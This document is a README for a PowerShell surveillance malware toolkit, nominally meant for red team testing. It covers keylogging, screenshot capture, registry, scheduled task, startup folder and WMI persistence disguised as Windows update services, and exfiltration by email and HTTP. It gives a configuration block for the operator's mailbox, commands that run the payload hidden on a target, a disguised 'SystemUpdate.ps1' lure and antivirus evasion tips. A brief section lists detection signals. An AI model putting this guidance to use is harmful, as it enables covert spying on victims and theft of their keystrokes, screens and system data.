# PowerShell Malware Toolkit

## Overview
A comprehensive PowerShell-based malware toolkit designed for red team testing and security research. This toolkit provides surveillance, persistence, and data exfiltration capabilities using native Windows PowerShell functionality.

## ⚠️ IMPORTANT DISCLAIMER
This software is for **EDUCATIONAL PURPOSES ONLY**. Use only on systems you own or have explicit permission to test. Unauthorized use may violate laws and regulations.

## Features

### 🔒 **Stealth & Evasion**
- Native PowerShell execution (no external dependencies)
- String obfuscation and encryption
- Multiple persistence mechanisms
- Silent operation with minimal user interaction
- Generic service names to avoid detection

### 📊 **Surveillance Capabilities**
- **Keylogging**: Real-time keyboard and mouse monitoring
- **Screenshot Capture**: Periodic screen captures
- **System Information**: Comprehensive system data collection
- **Windows Logs**: Event log monitoring and collection

### 🔗 **Persistence Mechanisms**
- **Registry**: Run key modification
- **Task Scheduler**: Scheduled task creation
- **Startup Folder**: Shortcut placement
- **WMI Event Subscription**: Event-driven execution
- **Periodic Movement**: Self-relocation to random locations

### 📤 **Data Exfiltration**
- **Email**: SMTP-based data transmission
- **HTTP**: Alternative web-based exfiltration
- **File Compression**: Data compression for efficient transfer
- **Multiple Endpoints**: Redundant transmission methods

## File Structure

```
PowerShell/
├── Main.ps1                 # Main entry point
├── Deploy.ps1              # Deployment and packaging script
├── README.md               # This documentation
└── Modules/
    ├── Persistence.ps1     # Persistence mechanisms
    ├── Surveillance.ps1    # Keylogging and monitoring
    ├── Communication.ps1   # Data exfiltration
    └── Crypto.ps1          # Encryption and obfuscation
```

## Installation & Deployment

### **Step 1: Configure Email Settings**
Edit `Main.ps1` and update the configuration section:

```powershell
$Config = @{
    Email = "your_email@gmail.com"      # Your email address
    Password = "your_app_password"      # Gmail app password
    SmtpServer = "smtp.gmail.com"       # SMTP server
    SmtpPort = 587                      # SMTP port
    UseTls = $true                      # Use TLS encryption
    LogInterval = 3600                  # Report interval (seconds)
    ScreenshotInterval = 300            # Screenshot interval (seconds)
    AudioInterval = 900                 # Audio interval (seconds)
    MoveInterval = 600                  # Movement interval (seconds)
}
```

### **Step 2: Deploy the Toolkit**
```powershell
# Basic deployment
.\Deploy.ps1

# Deploy with obfuscation
.\Deploy.ps1 -Obfuscate

# Deploy with executable wrapper
.\Deploy.ps1 -Obfuscate -CreateExecutable
```

### **Step 3: Execute on Target**
```powershell
# Method 1: Direct PowerShell execution
powershell.exe -ExecutionPolicy Bypass -File SystemUpdate.ps1

# Method 2: Silent execution
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File SystemUpdate.ps1 -Silent

# Method 3: With administrative privileges
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File SystemUpdate.ps1" -Verb RunAs
```

## Technical Details

### **Persistence Methods**

#### **1. Registry Persistence**
- **Location**: `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
- **Name**: `WindowsUpdateService`
- **Command**: PowerShell execution with hidden window

#### **2. Task Scheduler Persistence**
- **Task Name**: `Windows System Update`
- **Trigger**: At logon
- **Settings**: Hidden, runs on battery, continues on battery

#### **3. Startup Folder Persistence**
- **Location**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- **File**: `SystemUpdate.lnk` (shortcut)
- **Settings**: Minimized window

#### **4. WMI Event Subscription**
- **Filter**: Time-based event (every 60 seconds)
- **Consumer**: Command line execution
- **Binding**: Automatic execution

### **Surveillance Capabilities**

#### **Keylogging**
- **Method**: Windows API calls (`GetAsyncKeyState`)
- **Storage**: Temporary directory with timestamp
- **Features**: Character mapping, special key handling

#### **Screenshot Capture**
- **Method**: Windows Forms and GDI+
- **Format**: PNG with timestamp
- **Storage**: Compressed storage with cleanup

#### **System Information**
- **Data**: Computer name, user, OS, hardware, network
- **Format**: JSON with compression
- **Collection**: WMI queries and registry access

### **Data Exfiltration**

#### **Email Method**
- **Protocol**: SMTP with TLS
- **Attachments**: Screenshots and logs
- **Rate Limiting**: Built-in to avoid detection

#### **HTTP Method**
- **Protocol**: HTTPS POST requests
- **Encoding**: Base64 with compression
- **Endpoints**: Multiple for redundancy

## Red Team Testing Scenarios

### **Scenario 1: Initial Access**
```
1. User receives "SystemUpdate.ps1" file
2. User runs the script (double-click or command line)
3. UAC prompt appears for administrative privileges
4. User grants permission
5. Script establishes persistence and begins surveillance
```

### **Scenario 2: Persistence Testing**
```
1. Script creates multiple persistence mechanisms
2. System reboots
3. Script automatically restarts
4. Surveillance continues seamlessly
```

### **Scenario 3: Data Exfiltration**
```
1. Script collects data continuously
2. Periodic reports sent via email/HTTP
3. Screenshots and logs transmitted
4. Data compressed and encrypted
```

## Detection & Evasion

### **Antivirus Evasion**
- **Native PowerShell**: No external executables
- **String Obfuscation**: XOR encryption of strings
- **Generic Names**: Legitimate-looking service names
- **Minimal Footprint**: Small file size and memory usage

### **Network Evasion**
- **HTTPS Traffic**: Encrypted communication
- **Rate Limiting**: Prevents overwhelming network
- **User-Agent Spoofing**: Legitimate browser user agents
- **Multiple Endpoints**: Redundant communication paths

### **Process Evasion**
- **Hidden Windows**: No visible console
- **Job-Based Execution**: Background processing
- **Memory-Based**: Minimal disk writes
- **Registry Cleanup**: Removes traces

## Monitoring & Detection

### **What to Monitor**
1. **PowerShell Execution**: Unusual PowerShell activity
2. **Registry Changes**: Run key modifications
3. **Scheduled Tasks**: New task creation
4. **Network Traffic**: SMTP and HTTPS connections
5. **File System**: Temporary file creation

### **Detection Methods**
1. **Process Monitoring**: PowerShell process analysis
2. **Network Monitoring**: SMTP/HTTPS traffic analysis
3. **Registry Monitoring**: Run key changes
4. **File Monitoring**: Temporary directory activity
5. **Memory Analysis**: PowerShell script analysis

## Troubleshooting

### **Common Issues**

#### **Execution Policy**
```powershell
# Check current policy
Get-ExecutionPolicy

# Set policy for current user
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

#### **Email Configuration**
- Ensure Gmail 2FA is enabled
- Use app password (not regular password)
- Check SMTP settings and firewall

#### **Persistence Failures**
- Run as Administrator for registry/task scheduler
- Check Windows Defender settings
- Verify user permissions

### **Debug Mode**
```powershell
# Enable verbose output
$VerbosePreference = "Continue"
.\SystemUpdate.ps1 -Verbose
```

## Security Considerations

### **For Red Team Testing**
1. **Authorization**: Ensure written permission
2. **Documentation**: Record all testing activities
3. **Isolation**: Test in controlled environment
4. **Cleanup**: Remove persistence after testing
5. **Monitoring**: Watch for unintended effects

### **Legal Compliance**
- **Written Authorization**: Required for all testing
- **Scope Definition**: Clear testing boundaries
- **Data Handling**: Secure data management
- **Reporting**: Document all findings

## Advanced Usage

### **Customization**
- Modify configuration in `Main.ps1`
- Add custom surveillance modules
- Implement additional persistence methods
- Create custom exfiltration channels

### **Integration**
- Combine with other red team tools
- Integrate with C2 frameworks
- Add custom evasion techniques
- Implement additional obfuscation

## Support & Updates

### **Version History**
- **v1.0**: Initial release with basic functionality
- **v1.1**: Added obfuscation and deployment tools
- **v1.2**: Enhanced persistence and surveillance

### **Future Enhancements**
- Additional persistence methods
- Enhanced obfuscation techniques
- More exfiltration channels
- Advanced evasion capabilities

---

**Remember**: This toolkit is for authorized security testing only. Always ensure proper authorization and follow responsible disclosure practices. 